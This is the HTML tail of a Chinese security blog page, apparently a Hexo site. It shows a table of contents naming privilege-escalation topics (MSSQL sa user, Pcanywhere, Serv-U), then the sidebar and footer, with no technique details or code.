class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#流程概述"><span class="toc-text">流程概述</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#注意事项"><span class="toc-text">注意事项</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#利用流程"><span class="toc-text">利用流程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#直接外连提权"><span class="toc-text">直接外连提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#MSSQL提权"><span class="toc-text">MSSQL提权</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#利用sa用户"><span class="toc-text">利用sa用户</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#利用前提"><span class="toc-text">利用前提</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#提权思路"><span class="toc-text">提权思路</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#利用服务器的第三方组件提权"><span class="toc-text">利用服务器的第三方组件提权</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Pcanywhere"><span class="toc-text">Pcanywhere</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#原理-1"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Serv-U"><span class="toc-text">Serv-U</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#补充"><span class="toc-text">补充</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#总结一些经验"><span class="toc-text">总结一些经验</span></a></li></ol></li></ol></div>
+    </div>
+    
+    
+    
+    
+    <hr>
+    <div class="blogroll sidebar-item">
+      <div><i class="fas fa-link"></i>友情链接</div>
+      <ul>
+        
+        <li><i class="fas fa-link"></i><a href="https://github.com/TuringGu" target="_blank">GitHub</a></li>
+        
+      </ul>
+    </div>
+    
+  </div>
+</aside>
+
+
+          
+        </div>
+      </div>
+    </main>
+    
+<footer id="footer" class="footer" style="background: #33363b;">
+  <div class="container">
+    <div class="back-to-top">
+      <button id="back-to-top"><i class="fas fa-angle-double-up" aria-label="回到顶部"></i></button>
+    </div>
+    <div class="footer-container">
+      <div class="footer-left">
+        <div class="copyright">
+          <span class="author">TuringGu</span><span class="year"><i class="far fa-copyright"></i>2018 - 2019</span><span class="creative-commons"><i class="fab fa-creative-commons"></i><a href="http://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">BY-NC-ND 4.0</a></span>
+        </div>
+        
+        <div class="busuanzi">
+          <span id="busuanzi_container_site_pv"><i class="fas fa-eye" aria-label="站点点击量" aria-hidden="false"></i><span id="busuanzi_value_site_pv"></span></span><span id="busuanzi_container_site_uv"><i class="fas fa-user" aria-label="站点用户数" aria-hidden="false"></i><span id="busuanzi_value_site_uv"></span></span><span id="busuanzi_container_page_pv"><i class="far fa-file-alt"></i><span id="busuanzi_value_page_pv" aria-label="页面点击量" aria-hidden="false"></span></span>
+        </div>
+        
+      </div>
+      <div class="footer-right">
+        <div class="custom-info">
+          
+          托管于<i class="fab fa-github-alt"></i><a href="https://pages.github.com/" target="_blank">GitHub Pages</a>
+          
+        </div>
+        <div class="powered-by">
+          由 <a href="https://hexo.io/" target="_blank">Hexo</a> 强力驱动 | 主题 <a href="https://github.com/AlynxZhou/hexo-theme-aria/" target="_blank">ARIA</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+  </body>
+</html>
